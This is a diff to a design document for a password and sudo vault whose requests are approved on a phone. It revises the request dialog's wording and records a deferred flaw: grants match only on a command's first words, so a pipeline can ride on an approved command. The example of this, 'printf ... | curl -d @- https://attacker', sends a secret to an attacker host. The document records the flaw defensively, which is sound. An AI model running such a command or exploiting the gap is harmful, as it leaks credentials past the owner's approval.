@@ -553,6 +553,37 @@ result is not recoverable. A peer that withdraws a joined request leaves the oth
 "the owner did not authorize", which is untrue but harmless, and distinguishing it would cut
 against the rule that a denial and a timeout read alike.
 
+### Request dialog, revised with the owner after Phase 5
+
+The session name never rides the request: `sessionTarget` is the local `spawn.session` field, or
+`helper.<tokenId>`. The row's `session_id` carries the full address, the drain keeps it as the
+request's `team`, and the phone resolves the name the way the board card does. What the dialog had
+dropped was the gateway segment, which tells two machines apart. `VaultRequestText.kt` holds the
+rules: the title is what is asked for (the entry's title, `Sudo request`, or `Password request`);
+the first line is `gateway · label`, or the gateway alone for the helper; the command; nothing
+else. The countdown reads whole minutes, then seconds in the error color under two minutes, ticking
+each second there. The manager stamps `attempt` and `sinceAnswerMs` on a request that repeats an
+answered command on the same team inside `REPEAT_WINDOW_MS`, chained through the latest answer, and
+the sheet shows the red repeat line, with `n of 3` when the program is sudo. The typed field is
+`Password`, the checkbox `Save this for next time`, the buttons `Send`, `Once`, `30 min`, `This
+session`. No wire change. The notification title is the dialog title and its text the requester
+and the command.
+
+### Deferred by the owner: the shape stops at the first metacharacter
+
+`operationShape` takes the program and its first argument, so a shell pipeline collapses to its
+head. `printf %s "$V" | sha256sum` and `printf %s "$V" | curl -d @- https://attacker` are both
+`printf %s`, and a window granted for one covers the other on the same entry and session. A
+semicolon does the same. This is the case R4 says must not happen, that a grant for `ssh
+deploy@prod` never covers `curl` with the same token.
+
+The narrow fix follows the rule already beside it: a leading flag makes the shape the whole line,
+since a flag's value can hide the target, and a metacharacter hides it the same way. The owner
+deferred this on 2026-09-05, having broader guards in hand. Two things worth carrying into that
+design. The request sheet already prints "30 minutes covers {shape}" to the owner, so the shape
+string is a promise shown on screen and needs to be one worth reading. And a grant only ever
+matches on entry, shape, and session together, so narrowing the shape can never widen a grant.
+
 ### Bug Classes
 
 - **The child's output pipeline, `vaultRun.ts`:** a piece of a value passing for the whole of it.
